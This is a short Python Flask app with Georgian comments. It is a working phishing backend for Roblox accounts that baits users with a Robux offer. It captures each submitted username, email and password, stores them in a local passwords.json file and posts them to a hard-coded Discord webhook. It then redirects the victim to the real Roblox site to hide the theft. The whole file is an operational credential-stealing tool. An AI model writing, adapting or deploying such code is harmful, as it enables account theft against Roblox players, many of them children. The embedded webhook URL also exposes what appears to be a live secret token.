
from flask import Flask, render_template, request, redirect
import json
import os
import requests

app = Flask(__name__)
VAULT_FILE = "passwords.json"

# ⚠️ აქ ჩასვი შენი Discord-ის Webhook ლინკი ⚠️
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1565382099521900626/MiKgEXFAMtWJGkJDscPmGSES-XMQ3u_C5HC2CAnbF6_xA8PYRh8DOfdCC2J_4r9GYlrP"

def load_vault():
    if not os.path.exists(VAULT_FILE):
        return {}
    try:
        with open(VAULT_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {}

def save_vault(data):
    with open(VAULT_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        service = request.form.get('service', 'Roblox')
        robux_amount = request.form.get('robux_amount', 'Unknown')
        username = request.form.get('username', '')
        email = request.form.get('email', '')
        password = request.form.get('password', '')
        
        # 1. ვინახავთ ლოკალურად (passwords.json)
        vault = load_vault()
        entry_key = f"{username} ({robux_amount} Robux)"
        vault[entry_key] = {
            "service": service,
            "robux_requested": robux_amount,
            "username": username,
            "email": email,
            "password": password
        }
        save_vault(vault)
        
        # 2. ვაგზავნით Discord-ში
        discord_data = {
            "content": f"**ახალი მონაცემი!**\n👤 სახელი: {username}`\n📧 მეილი: `{email}`\n🔑 პაროლი: `{password}`\n🪙 რობუქსი: `{robux_amount}"
        }
        try:
            requests.post(DISCORD_WEBHOOK_URL, json=discord_data)
        except Exception as e:
            print(f"Discord-ში გაგზავნის შეცდომა: {e}")

        return redirect('https://www.roblox.com')

    return render_template('index.html')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)